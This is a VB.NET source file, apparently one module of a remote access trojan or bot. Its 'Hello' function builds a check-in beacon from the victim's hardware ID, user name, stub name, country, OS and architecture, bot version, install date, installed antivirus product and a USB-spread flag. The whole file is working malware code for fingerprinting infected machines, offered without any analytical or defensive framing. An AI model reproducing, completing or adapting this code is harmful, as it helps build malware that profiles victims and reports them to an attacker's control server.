
Public Class ID
    Public Shared Function Hello() As String
        On Error Resume Next
        Dim LV As String = String.Empty

        'ID
        LV &= LID & "_" & HWID() & LKEY

        'get User name
        LV &= UserName() & LKEY

        'stub name
        LV &= BinName() & LKEY

        'get Country
        LV &= GLOC() & LKEY

        'Get OS
        LV += GOS() & " " + Bit() & LKEY

        'version
        LV &= LVER & LKEY

        'Install Date
        LV &= INDATE() & LKEY

        'AV name
        LV &= GAV() & LKEY

        'check spread
        LV &= SPUSB_TEXT & LKEY

        Return LV
    End Function

    'user name
    Public Shared Function UserName()
        Try
            Return Environment.UserName
        Catch ex As Exception
            Return "Error"
        End Try
    End Function

    'bin name
    Public Shared Function BinName()
        Try
            Return IO.Path.GetFileName(NEXE.Name)
        Catch ex As Exception
            Return "Error"
        End Try
    End Function

    'install Date
    Public Shared Function INDATE() As String
        Try
            Return CType(NEXE, IO.FileInfo).LastWriteTime.ToString("dd/MM/yyy")
        Catch ex As Exception
            Return "Error"
        End Try
    End Function

    'HWID
    Private Declare Function GetVolumeInformation Lib "kernel32" Alias "GetVolumeInformationA" (ByVal lpRootPathName As String, ByVal lpVolumeNameBuffer As String, ByVal nVolumeNameSize As Integer, ByRef lpVolumeSerialNumber As Integer, ByRef lpMaximumComponentLength As Integer, ByRef lpFileSystemFlags As Integer, ByVal lpFileSystemNameBuffer As String, ByVal nFileSystemNameSize As Integer) As Integer
    Public Shared Function HWID() As String
        Try
            Dim sn As Integer
            GetVolumeInformation(Environ("SystemDrive") & "\", Nothing, Nothing, sn, 0, 0, Nothing, Nothing)
            Return (Hex(sn))
        Catch ex As Exception
            Return "Error"
        End Try
    End Function

    'AV
    Public Shared Function GAV() As String
        Try
            Dim AV_NAME As String = Nothing
            Dim searcher As New Management.ManagementObjectSearcher("\\" & Environment.MachineName & "\root\SecurityCenter2", "SELECT * FROM AntivirusProduct")
            Dim instances As Management.ManagementObjectCollection = searcher.[Get]()
            For Each queryObj As Management.ManagementObject In instances
                AV_NAME = queryObj("displayName").ToString()
            Next
            If AV_NAME = String.Empty Then AV_NAME = "None"
            AV_NAME = "" & AV_NAME.ToString
            Return AV_NAME
            searcher.Dispose()
        Catch
            Return "Error"
        End Try
    End Function

    'Country
    Public Shared Function GLOC() As String
        Try
            Return Globalization.RegionInfo.CurrentRegion.EnglishName()
        Catch ex As Exception
            Return "Error"
        End Try
    End Function

    'os
    Public Shared Function GOS()
        Try
            Return My.Computer.Info.OSFullName.Replace("Microsoft", "").Replace("Windows", "Win").Replace("®", "").Replace("™", "").Replace("  ", " ").Replace(" Win", "Win")
        Catch ex As Exception
            Return "Error"
        End Try
    End Function

    'bit
    Public Shared Function Bit()
        Try
            If Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Contains("x86") Then
                Return "x64"
            Else
                Return "x86"
            End If
        Catch ex As Exception
            Return "Error"
        End Try
    End Function

End Class